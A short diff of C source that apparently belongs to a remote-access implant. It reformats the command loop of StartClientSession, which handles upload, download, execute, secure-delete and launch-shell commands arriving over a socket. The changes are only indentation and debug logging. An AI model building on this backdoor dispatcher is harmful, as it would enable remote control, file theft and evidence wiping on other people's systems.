@@ -500,36 +500,36 @@ unsigned long StartClientSession( int sock )
 			{
 				case EXIT:
 					DLX(2, printf("EXIT command received.\n"));
-						fQuit = 1;
+					fQuit = 1;
 					ret.reply = 0;
 					break;
 
 				case UPLOAD:
 					DLX(2, printf("UPLOAD command received.\n"));
-						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
+					ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
 					break;
 
 				case DOWNLOAD:
 					DLX(2, printf("DOWNLOAD command received.\n"));
-						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
+					ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
 					break;
 
 				case EXECUTE:
 					DLX(2, printf("EXECUTE command received.\n"));
-						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
+					memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
 					ret.reply = Execute( commandpath );
 					break;
 
 
 				case DELETE:
 					DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
-						ret.reply = SecureDelete(commandpath);
+					ret.reply = SecureDelete(commandpath);
 
 					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
 					if (ret.reply != 0)
 					{
 						DLX(2, printf("Now attempting to UNLINK the file: %s\n", commandpath));
-							ret.reply = DelFile(commandpath);
+						ret.reply = DelFile(commandpath);
 					}
 					break;
 //TODO: The following code (from here through the exit) needs to be reviewed.
@@ -552,7 +552,7 @@ unsigned long StartClientSession( int sock )
 				case LAUNCHTRUESHELL:
 					DLX(2, printf("LAUNCHTRUESHELL command received.\n"));
 					ret.reply = launchShell(commandpath);
-					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
+					DLX(3, printf("launchshell() returned %i\n", (int)ret.reply));
 					break;
 
 				default:
